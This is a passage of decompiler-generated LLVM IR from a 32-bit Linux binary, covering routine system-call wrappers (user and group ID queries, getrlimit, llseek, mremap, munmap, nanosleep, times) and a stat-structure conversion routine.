599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805465d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054658, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80545ba, { 1, 0 }
}

define i32 @function_8054665() local_unnamed_addr {
dec_label_pc_8054665:
  %stack_var_-8 = alloca i32, align 4
  %v2_8054668 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805466f = call i32 @function_805470f(i32 7, i32 %v2_8054668)
  store i32 256, i32* @edx, align 4
  %v2_805467c = icmp slt i32 %v2_805466f, 0
  br i1 %v2_805467c, label %dec_label_pc_8054684, label %dec_label_pc_8054680

dec_label_pc_8054680:                             ; preds = %dec_label_pc_8054665
  %v3_8054680 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8054680, i32* @edx, align 4
  br label %dec_label_pc_8054684

dec_label_pc_8054684:                             ; preds = %dec_label_pc_8054665, %dec_label_pc_8054680
  %v0_8054684 = phi i32 [ 256, %dec_label_pc_8054665 ], [ %v3_8054680, %dec_label_pc_8054680 ]
  ret i32 %v0_8054684

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8054684, { 1, 0 }
}

define i32 @function_805468a() local_unnamed_addr {
dec_label_pc_805468a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805468a = load i32, i32* @ebx, align 4
  store i32 %v0_805468a, i32* %stack_var_-4, align 4
  %v1_8054693 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054693, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8054693, -4095
  br i1 %tmp7, label %dec_label_pc_80546aa, label %dec_label_pc_805469e

dec_label_pc_805469e:                             ; preds = %dec_label_pc_805468a
  %v1_805469e = call i32 @function_8052719(i32 %v0_805468a)
  %v0_80546a3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546a3 = sub i32 0, %v0_80546a3
  %v2_80546a5 = inttoptr i32 %v1_805469e to i32*
  store i32 %v1_80546a3, i32* %v2_80546a5, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546ae.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546aa

dec_label_pc_80546aa:                             ; preds = %dec_label_pc_805468a, %dec_label_pc_805469e
  %v2_80546ae = phi i32 [ %v0_805468a, %dec_label_pc_805468a ], [ %v2_80546ae.pre, %dec_label_pc_805469e ]
  %v0_80546aa = phi i32 [ %v1_8054693, %dec_label_pc_805468a ], [ -1, %dec_label_pc_805469e ]
  store i32 %v2_80546ae, i32* @ebx, align 4
  ret i32 %v0_80546aa

; uselistorder directives
  uselistorder i32 %v1_8054693, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546aa, { 1, 0 }
}

define i32 @function_80546b0() local_unnamed_addr {
dec_label_pc_80546b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80546b0, i32* %stack_var_-4, align 4
  %v1_80546b9 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80546b9, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546b9, -4095
  br i1 %tmp7, label %dec_label_pc_80546d0, label %dec_label_pc_80546c4

dec_label_pc_80546c4:                             ; preds = %dec_label_pc_80546b0
  %v1_80546c4 = call i32 @function_8052719(i32 %v0_80546b0)
  %v0_80546c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546c9 = sub i32 0, %v0_80546c9
  %v2_80546cb = inttoptr i32 %v1_80546c4 to i32*
  store i32 %v1_80546c9, i32* %v2_80546cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546d4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546d0

dec_label_pc_80546d0:                             ; preds = %dec_label_pc_80546b0, %dec_label_pc_80546c4
  %v2_80546d4 = phi i32 [ %v0_80546b0, %dec_label_pc_80546b0 ], [ %v2_80546d4.pre, %dec_label_pc_80546c4 ]
  %v0_80546d0 = phi i32 [ %v1_80546b9, %dec_label_pc_80546b0 ], [ -1, %dec_label_pc_80546c4 ]
  store i32 %v2_80546d4, i32* @ebx, align 4
  ret i32 %v0_80546d0

; uselistorder directives
  uselistorder i32 %v1_80546b9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546d0, { 1, 0 }
}

define i32 @function_80546d6() local_unnamed_addr {
dec_label_pc_80546d6:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80546d6, i32* %stack_var_-4, align 4
  %v1_80546df = call i32 @int80_syscall(i32 200)
  store i32 %v1_80546df, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546df, -4095
  br i1 %tmp7, label %dec_label_pc_80546f6, label %dec_label_pc_80546ea

dec_label_pc_80546ea:                             ; preds = %dec_label_pc_80546d6
  %v1_80546ea = call i32 @function_8052719(i32 %v0_80546d6)
  %v0_80546ef = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546ef = sub i32 0, %v0_80546ef
  %v2_80546f1 = inttoptr i32 %v1_80546ea to i32*
  store i32 %v1_80546ef, i32* %v2_80546f1, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546fa.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546f6

dec_label_pc_80546f6:                             ; preds = %dec_label_pc_80546d6, %dec_label_pc_80546ea
  %v2_80546fa = phi i32 [ %v0_80546d6, %dec_label_pc_80546d6 ], [ %v2_80546fa.pre, %dec_label_pc_80546ea ]
  %v0_80546f6 = phi i32 [ %v1_80546df, %dec_label_pc_80546d6 ], [ -1, %dec_label_pc_80546ea ]
  store i32 %v2_80546fa, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80546f6

; uselistorder directives
  uselistorder i32 %v1_80546df, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546f6, { 1, 0 }
}

define i32 @function_80546fc() local_unnamed_addr {
dec_label_pc_80546fc:
  %v0_80546fc = load i32, i32* @global_var_8056924.240, align 4
  %v1_8054706 = icmp eq i32 %v0_80546fc, 0
  br i1 %v1_8054706, label %dec_label_pc_805470c, label %dec_label_pc_805470a

dec_label_pc_805470a:                             ; preds = %dec_label_pc_80546fc
  br label %dec_label_pc_805470c

dec_label_pc_805470c:                             ; preds = %dec_label_pc_80546fc, %dec_label_pc_805470a
  %storemerge = phi i32 [ %v0_80546fc, %dec_label_pc_805470a ], [ 4096, %dec_label_pc_80546fc ]
  %v0_805470c = phi i32 [ %v0_80546fc, %dec_label_pc_805470a ], [ 4096, %dec_label_pc_80546fc ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805470c

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_805470c, { 1, 0 }
}

define i32 @function_805470f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805470f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805470f = load i32, i32* @ebx, align 4
  store i32 %v0_805470f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054722 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8054722, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054722, -4095
  br i1 %tmp9, label %dec_label_pc_805473b, label %dec_label_pc_805472f

dec_label_pc_805472f:                             ; preds = %dec_label_pc_805470f
  %v1_805472f = call i32 @function_8052719(i32 %v0_805470f)
  %v0_8054734 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054734 = sub i32 0, %v0_8054734
  %v2_8054736 = inttoptr i32 %v1_805472f to i32*
  store i32 %v1_8054734, i32* %v2_8054736, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805473f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805473b

dec_label_pc_805473b:                             ; preds = %dec_label_pc_805470f, %dec_label_pc_805472f
  %v2_805473f = phi i32 [ %v0_805470f, %dec_label_pc_805470f ], [ %v2_805473f.pre, %dec_label_pc_805472f ]
  %v0_805473b = phi i32 [ %v1_8054722, %dec_label_pc_805470f ], [ -1, %dec_label_pc_805472f ]
  store i32 %v2_805473f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805473b

; uselistorder directives
  uselistorder i32 %v1_8054722, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805473b, { 1, 0 }
}

define i32 @function_8054741() local_unnamed_addr {
dec_label_pc_8054741:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054741 = load i32, i32* @ebx, align 4
  store i32 %v0_8054741, i32* %stack_var_-4, align 4
  %v1_805474a = call i32 @int80_syscall(i32 199)
  store i32 %v1_805474a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805474a, -4095
  br i1 %tmp7, label %dec_label_pc_8054761, label %dec_label_pc_8054755

dec_label_pc_8054755:                             ; preds = %dec_label_pc_8054741
  %v1_8054755 = call i32 @function_8052719(i32 %v0_8054741)
  %v0_805475a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805475a = sub i32 0, %v0_805475a
  %v2_805475c = inttoptr i32 %v1_8054755 to i32*
  store i32 %v1_805475a, i32* %v2_805475c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054765.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054761

dec_label_pc_8054761:                             ; preds = %dec_label_pc_8054741, %dec_label_pc_8054755
  %v2_8054765 = phi i32 [ %v0_8054741, %dec_label_pc_8054741 ], [ %v2_8054765.pre, %dec_label_pc_8054755 ]
  %v0_8054761 = phi i32 [ %v1_805474a, %dec_label_pc_8054741 ], [ -1, %dec_label_pc_8054755 ]
  store i32 %v2_8054765, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054761

; uselistorder directives
  uselistorder i32 %v1_805474a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054761, { 1, 0 }
}

define i32 @function_8054767(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054767:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805477d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805477d, i32* %esi.global-to-local, align 4
  %v1_8054794 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054794, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054794, -4095
  br i1 %tmp18, label %dec_label_pc_80547ae, label %dec_label_pc_80547a0

dec_label_pc_80547a0:                             ; preds = %dec_label_pc_8054767
  %v2_8054781 = ashr i32 %tmp8, 31
  %v1_80547a0 = call i32 @function_8052719(i32 %v2_8054781)
  %v0_80547a5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547a5 = sub i32 0, %v0_80547a5
  %v2_80547a7 = inttoptr i32 %v1_80547a0 to i32*
  store i32 %v1_80547a5, i32* %v2_80547a7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547b2

dec_label_pc_80547ae:                             ; preds = %dec_label_pc_8054767
  %v1_80547ae = icmp eq i32 %v1_8054794, 0
  br i1 %v1_80547ae, label %dec_label_pc_80547b7, label %dec_label_pc_80547b2

dec_label_pc_80547b2:                             ; preds = %dec_label_pc_80547ae, %dec_label_pc_80547a0
  %v0_80547b2 = phi i32 [ %v1_8054794, %dec_label_pc_80547ae ], [ -1, %dec_label_pc_80547a0 ]
  %v1_80547b4 = ashr i32 %v0_80547b2, 31
  br label %dec_label_pc_80547bf

dec_label_pc_80547b7:                             ; preds = %dec_label_pc_80547ae
  %v3_80547b7 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80547bf

dec_label_pc_80547bf:                             ; preds = %dec_label_pc_80547b2, %dec_label_pc_80547b7
  %v0_80547c5 = phi i32 [ %v0_80547b2, %dec_label_pc_80547b2 ], [ %v3_80547b7, %dec_label_pc_80547b7 ]
  %storemerge = phi i32 [ %v1_80547b4, %dec_label_pc_80547b2 ], [ %tmp, %dec_label_pc_80547b7 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80547c5

; uselistorder directives
  uselistorder i32 %v1_8054794, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547bf, { 1, 0 }
}

define i32 @function_80547c6(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80547c6:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80547c7 = load i32, i32* @esi, align 4
  store i32 %v0_80547c7, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80547df = load i32, i32* @ebx, align 4
  %v5_80547e7 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_80547e7 = ptrtoint i32* %v5_80547e7 to i32
  store i32 %v0_80547df, i32* @ebx, align 4
  store i32 %v6_80547e7, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_80547e7, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_80547f3, label %dec_label_pc_80547ff

dec_label_pc_80547f3:                             ; preds = %dec_label_pc_80547c6
  %v1_80547f3 = call i32 @function_8052719(i32 %v0_80547df)
  %v0_80547f8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547f8 = sub i32 0, %v0_80547f8
  %v2_80547fa = inttoptr i32 %v1_80547f3 to i32*
  store i32 %v1_80547f8, i32* %v2_80547fa, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8054802.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80547ff

dec_label_pc_80547ff:                             ; preds = %dec_label_pc_80547c6, %dec_label_pc_80547f3
  %v2_8054802 = phi i32 [ %v0_80547c7, %dec_label_pc_80547c6 ], [ %v2_8054802.pre, %dec_label_pc_80547f3 ]
  %v0_80547ff = phi i32 [ %v6_80547e7, %dec_label_pc_80547c6 ], [ -1, %dec_label_pc_80547f3 ]
  %v2_8054801 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054801, i32* @edx, align 4
  store i32 %v2_8054802, i32* @esi, align 4
  ret i32 %v0_80547ff

; uselistorder directives
  uselistorder i32 %v0_80547df, { 1, 0 }
  uselistorder label %dec_label_pc_80547ff, { 1, 0 }
}

define i32 @function_8054805(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054805:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054805 = load i32, i32* @ebx, align 4
  store i32 %v0_8054805, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8054818 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8054818, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8054818, -4095
  br i1 %tmp10, label %dec_label_pc_8054831, label %dec_label_pc_8054825

dec_label_pc_8054825:                             ; preds = %dec_label_pc_8054805
  %v1_8054825 = call i32 @function_8052719(i32 %v0_8054805)
  %v0_805482a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805482a = sub i32 0, %v0_805482a
  %v2_805482c = inttoptr i32 %v1_8054825 to i32*
  store i32 %v1_805482a, i32* %v2_805482c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054835.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054831

dec_label_pc_8054831:                             ; preds = %dec_label_pc_8054805, %dec_label_pc_8054825
  %v2_8054835 = phi i32 [ %v0_8054805, %dec_label_pc_8054805 ], [ %v2_8054835.pre, %dec_label_pc_8054825 ]
  %v0_8054831 = phi i32 [ %v3_8054818, %dec_label_pc_8054805 ], [ -1, %dec_label_pc_8054825 ]
  %v2_8054833 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054833, i32* @edx, align 4
  store i32 %v2_8054835, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054831

; uselistorder directives
  uselistorder i32 %v3_8054818, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054831, { 1, 0 }
}

define i32 @function_8054837(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054837:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054837 = load i32, i32* @ebx, align 4
  store i32 %v0_8054837, i32* %stack_var_-4, align 4
  %v4_805483b = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805483b, i32* %ebx.global-to-local, align 4
  %v6_805484a = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_805484a, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_805484a, -4095
  br i1 %tmp11, label %dec_label_pc_8054863, label %dec_label_pc_8054857

dec_label_pc_8054857:                             ; preds = %dec_label_pc_8054837
  %v1_8054857 = call i32 @function_8052719(i32 %v0_8054837)
  %v0_805485c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805485c = sub i32 0, %v0_805485c
  %v2_805485e = inttoptr i32 %v1_8054857 to i32*
  store i32 %v1_805485c, i32* %v2_805485e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054867.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054863

dec_label_pc_8054863:                             ; preds = %dec_label_pc_8054837, %dec_label_pc_8054857
  %v2_8054867 = phi i32 [ %v0_8054837, %dec_label_pc_8054837 ], [ %v2_8054867.pre, %dec_label_pc_8054857 ]
  %v0_8054863 = phi i32 [ %v6_805484a, %dec_label_pc_8054837 ], [ -1, %dec_label_pc_8054857 ]
  %v2_8054865 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054865, i32* @edx, align 4
  store i32 %v2_8054867, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054863

; uselistorder directives
  uselistorder i32 %v6_805484a, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054863, { 1, 0 }
}

define i32 @function_8054869(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054869:
  %stack_var_-12 = alloca i32, align 4
  %v0_805486a = load i32, i32* @ebx, align 4
  %v0_805486e = load i32, i32* @global_var_8056938.247, align 8
  %v1_805486e = icmp eq i32 %v0_805486e, 0
  %v1_8054879 = icmp eq i1 %v1_805486e, false
  br i1 %v1_8054879, label %dec_label_pc_805488c, label %dec_label_pc_805487b

dec_label_pc_805487b:                             ; preds = %dec_label_pc_8054869
  %v1_8054880 = call i32 @function_8054a2f(i32 0)
  %v2_8054888 = icmp slt i32 %v1_8054880, 0
  br i1 %v2_8054888, label %dec_label_pc_80548ae, label %dec_label_pc_805487b.dec_label_pc_805488c_crit_edge

dec_label_pc_805487b.dec_label_pc_805488c_crit_edge: ; preds = %dec_label_pc_805487b
  %v0_805488e.pre = load i32, i32* @global_var_8056938.247, align 8
  br label %dec_label_pc_805488c

dec_label_pc_805488c:                             ; preds = %dec_label_pc_805487b.dec_label_pc_805488c_crit_edge, %dec_label_pc_8054869
  %v0_805489c = phi i32 [ %v0_805488e.pre, %dec_label_pc_805487b.dec_label_pc_805488c_crit_edge ], [ %v0_805486e, %dec_label_pc_8054869 ]
  %v1_805488c = icmp eq i32 %arg1, 0
  %v1_8054893 = icmp eq i1 %v1_805488c, false
  br i1 %v1_8054893, label %dec_label_pc_8054899, label %dec_label_pc_8054895

dec_label_pc_8054895:                             ; preds = %dec_label_pc_805488c
  br label %dec_label_pc_80548b1

dec_label_pc_8054899:                             ; preds = %dec_label_pc_805488c
  store i32 %v0_805489c, i32* @ebx, align 4
  %v2_805489e = add i32 %v0_805489c, %arg1
  %v1_80548a2 = call i32 @function_8054a2f(i32 %v2_805489e)
  %v2_80548aa = icmp slt i32 %v1_80548a2, 0
  %v1_80548ac = icmp eq i1 %v2_80548aa, false
  br i1 %v1_80548ac, label %dec_label_pc_8054899.dec_label_pc_80548b1_crit_edge, label %dec_label_pc_80548ae

dec_label_pc_8054899.dec_label_pc_80548b1_crit_edge: ; preds = %dec_label_pc_8054899
  %v0_80548b1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80548b1

dec_label_pc_80548ae:                             ; preds = %dec_label_pc_8054899, %dec_label_pc_805487b
  br label %dec_label_pc_80548b1

dec_label_pc_80548b1:                             ; preds = %dec_label_pc_8054899.dec_label_pc_80548b1_crit_edge, %dec_label_pc_8054895, %dec_label_pc_80548ae
  %v0_80548b1 = phi i32 [ %v0_80548b1.pre, %dec_label_pc_8054899.dec_label_pc_80548b1_crit_edge ], [ %v0_805489c, %dec_label_pc_8054895 ], [ -1, %dec_label_pc_80548ae ]
  %v2_80548b3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80548b3, i32* @edx, align 4
  store i32 %v0_805486a, i32* @ebx, align 4
  ret i32 %v0_80548b1

; uselistorder directives
  uselistorder i32 %v0_805489c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8054a2f, { 1, 0 }
  uselistorder label %dec_label_pc_80548b1, { 2, 0, 1 }
}

define i32 @function_80548b7(%tms* %arg1) local_unnamed_addr {
dec_label_pc_80548b7:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80548b7 = load i32, i32* @edi, align 4
  store i32 %v0_80548b7, i32* %stack_var_-4, align 4
  %v4_80548bb = ptrtoint %tms* %arg1 to i32
  store i32 %v4_80548bb, i32* %edi.global-to-local, align 4
  %v0_80548bf = load i32, i32* @ebx, align 4
  %v3_80548c7 = call i32 @times(%tms* %arg1)
  store i32 %v3_80548c7, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80548c7, -4095
  br i1 %tmp9, label %dec_label_pc_80548df, label %dec_label_pc_80548d3

dec_label_pc_80548d3:                             ; preds = %dec_label_pc_80548b7
  %v1_80548d3 = call i32 @function_8052719(i32 %v0_80548bf)
  %v0_80548d8 = load i32, i32* %edi.global-to-local, align 4
  %v1_80548d8 = sub i32 0, %v0_80548d8
  %v2_80548da = inttoptr i32 %v1_80548d3 to i32*
  store i32 %v1_80548d8, i32* %v2_80548da, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80548e3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80548df

dec_label_pc_80548df:                             ; preds = %dec_label_pc_80548b7, %dec_label_pc_80548d3
  %v2_80548e3 = phi i32 [ %v0_80548b7, %dec_label_pc_80548b7 ], [ %v2_80548e3.pre, %dec_label_pc_80548d3 ]
  %v0_80548df = phi i32 [ %v3_80548c7, %dec_label_pc_80548b7 ], [ -1, %dec_label_pc_80548d3 ]
  store i32 %v2_80548e3, i32* %edi.global-to-local, align 4
  ret i32 %v0_80548df

; uselistorder directives
  uselistorder i32 %v3_80548c7, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 171, 7, 172, 173, 174, 1, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 91, 92, 93, 94, 95, 96, 97, 98, 99, 193, 207, 208, 194, 195, 196, 197, 198, 199, 200, 201, 2, 202, 203, 204, 205, 206, 209, 210, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 211, 212, 132, 133, 134, 135, 10, 213, 214, 11, 215, 216, 217, 218, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 5, 168, 169, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 241, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80548df, { 1, 0 }
}

define i32 @function_80548e5(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80548e5:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80548e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80548e6, i32* %stack_var_-8, align 4
  %v4_80548ea = ptrtoint i16* %arg1 to i32
  store i32 %v4_80548ea, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_80548f7 = inttoptr i32 %arg2 to i8*
  %v4_80548f7 = call i32 @function_805276a(i8* %v3_80548f7, i32 0, i32 88)
  store i32 %v4_80548f7, i32* %eax.global-to-local, align 4
  %v2_80548fc = load i16, i16* %arg1, align 2
  %v3_80548fc = zext i16 %v2_80548fc to i32
  store i32 %v3_80548fc, i32* %eax.global-to-local, align 4
  %v0_80548ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548ff = add i32 %v0_80548ff, 4
  %v2_80548ff = inttoptr i32 %v1_80548ff to i32*
  store i32 0, i32* %v2_80548ff, align 4
  %v0_8054906 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054906 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054906 = inttoptr i32 %v1_8054906 to i32*
  store i32 %v0_8054906, i32* %v2_8054906, align 4
  %v0_8054908 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054908 = add i32 %v0_8054908, 4
  %v2_8054908 = inttoptr i32 %v1_8054908 to i32*
  %v3_8054908 = load i32, i32* %v2_8054908, align 4
  store i32 %v3_8054908, i32* %eax.global-to-local, align 4
  %v1_805490b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805490b = add i32 %v1_805490b, 12
  %v3_805490b = inttoptr i32 %v2_805490b to i32*
  store i32 %v3_8054908, i32* %v3_805490b, align 4
  %v0_805490e = load i32, i32* %esi.global-to-local, align 4
  %v1_805490e = add i32 %v0_805490e, 8
  %v2_805490e = inttoptr i32 %v1_805490e to i16*
  %v3_805490e = load i16, i16* %v2_805490e, align 2
  %v4_805490e = zext i16 %v3_805490e to i32
  store i32 %v4_805490e, i32* %eax.global-to-local, align 4
  %v1_8054912 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054912 = add i32 %v1_8054912, 16
  %v3_8054912 = inttoptr i32 %v2_8054912 to i32*
  store i32 %v4_805490e, i32* %v3_8054912, align 4
  %v0_8054915 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054915 = add i32 %v0_8054915, 10
  %v2_8054915 = inttoptr i32 %v1_8054915 to i16*
